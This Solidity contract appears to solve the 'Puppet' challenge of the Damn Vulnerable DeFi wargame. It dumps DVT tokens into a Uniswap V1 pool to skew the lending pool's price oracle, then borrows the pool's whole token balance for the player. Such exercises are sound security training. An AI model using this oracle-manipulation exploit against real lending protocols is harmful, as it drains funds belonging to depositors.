// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline,
        address recipient
    ) external returns (uint256);
}

interface IPuppetPool {
    function borrow(uint256 amount, address recipient) external payable;

    function calculateDepositRequired(
        uint256 amount
    ) external view returns (uint256);
}

contract Attack8 {
    IPuppetPool private immutable puppetPool;
    IUniswapExchangeV1 public immutable uniswapPair;
    IERC20 public immutable token;
    address private immutable player;

    receive() external payable {}

    constructor(
        address _puppetPool,
        IUniswapExchangeV1 _uniswapPair,
        address _token,
        address _player
    ) {
        puppetPool = IPuppetPool(_puppetPool);
        uniswapPair = IUniswapExchangeV1(_uniswapPair);
        token = IERC20(_token);
        player = _player;
    }

    function attack() external payable {
        // Dump DVT to the Uniswap Pool
        uint256 tokenAmount = token.balanceOf(address(this));
        token.approve(address(uniswapPair), tokenAmount);
        uniswapPair.tokenToEthTransferInput(
            tokenAmount,
            9,
            block.timestamp,
            address(this)
        );

        // Calculate required collateral
        uint256 borrowAmount = token.balanceOf(address(puppetPool));
        puppetPool.borrow{value: msg.value}(borrowAmount, player);
    }
}
